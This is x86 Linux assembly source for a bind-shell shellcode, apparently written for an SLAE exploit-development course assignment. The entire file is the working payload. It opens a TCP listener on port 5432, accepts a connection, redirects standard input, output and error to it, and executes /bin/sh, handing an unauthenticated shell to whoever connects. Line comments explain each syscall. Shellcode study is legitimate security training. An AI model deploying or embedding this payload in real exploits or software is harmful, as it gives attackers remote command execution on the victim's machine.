;Title: SLAE/Assignment -1/Shell_Bind_TCP shellcode
;Shell_Bind_TCP shellcode to TCP 5432 Port
;SLAE-1122
;Shellcode Length: 103

global _start

section .text

_start:

;int socket(int domain, int type, int protocol)
  
	xor ebx, ebx 		;zero out ebx
  	mul ebx 		;zero out eax,edx
  	mov al, 0x66 		;socketcall syscall
  	mov bl,  0x1 		;socketcall type, socket
  	push edx 		;IPPROTO_IP = 0
 	push ebx 		;SOCK_STREAM = 1
  	push  	 0x2 		;AF_INET = 2
  	mov ecx, esp 		;socketcall are in ECX
  	int 0x80 		;execute socket syscall
  	mov edx, eax

;int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen)

        xor edi, edi 		;zero out edi
  	mov al, 0x66 		;socketcall syscall
  	mov bl, 0x2    		;socketcall type (sys_bind 2)

;sockaddr_in

	push edi    		;INADDR_ANY = 0
  	push word 0x3815 	;TCP Port where need to BIND the Shell, here 5432 (hex in reverse order) 
  	push word 0x2 		;AF_INET = 2
  	mov ecx, esp 		;sockaddr_in in ECX
	push 0x10  		;push bind addrlen to the stack
  	push ecx
  	push edx
	mov ecx, esp
	int 0x80  		;execute bind syscall

;int listen(int sockfd, int backlog); ; listen(sockfd, 0)

 	mov al, 0x66 		;socketcall syscall
  	mov bl, 0x4 		;socketcall type (sys_listen 4)
  	push edi
  	push edx		;file descriptor returned to socket
  	mov ecx, esp
  	int 0x80  		;execute listen syscall

;int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)

  	mov al, 0x66 		;socketcall syscall
  	mov bl, 0x5 		;socketcall type (sys_accept 5)
  	push edi
  	push edi
  	push edx		;file descriptor returned to socket
  	mov ecx, esp
  	int 0x80  		;execute accept syscall
  	mov edx, eax 		;accept syscall into EDX

;int dup2(int oldfd, int newfd)

 	 mov ebx, edx
  	 xor ecx, ecx

  	   dup2:			;Redirect Standard Input (0), Standard Output(1) and Standard Error (2)
  		mov al, 0x3f 		;dup2 syscall
  		int 0x80 		;execute dup2 syscall
  		inc cl			;increment CL with value 1
  		cmp cl,3 		;check if CL is 3?
  		je xbshell  		;If CL is 3 then jump to xbshell
  		jmp dup2    		;If CL is not 3 continue loop i.e. dup2

 			xbshell:
 				;execve for SHELL!!!!
 				xor ecx, ecx       ;zero out ecx
 				mul ecx            ;zero out eax,edx
 				push ecx           ;push ECX on the stack
				push 0x68732f6e
 				push 0x69622f2f    ;'//bin/sh' = 0x68732f6e  0x69622f2f
				mov ebx, esp       ; EBX is point to '//bin/sh'
 				mov al, 11 	   ;execve syscall 
 				int 0x80 	   ;system_call
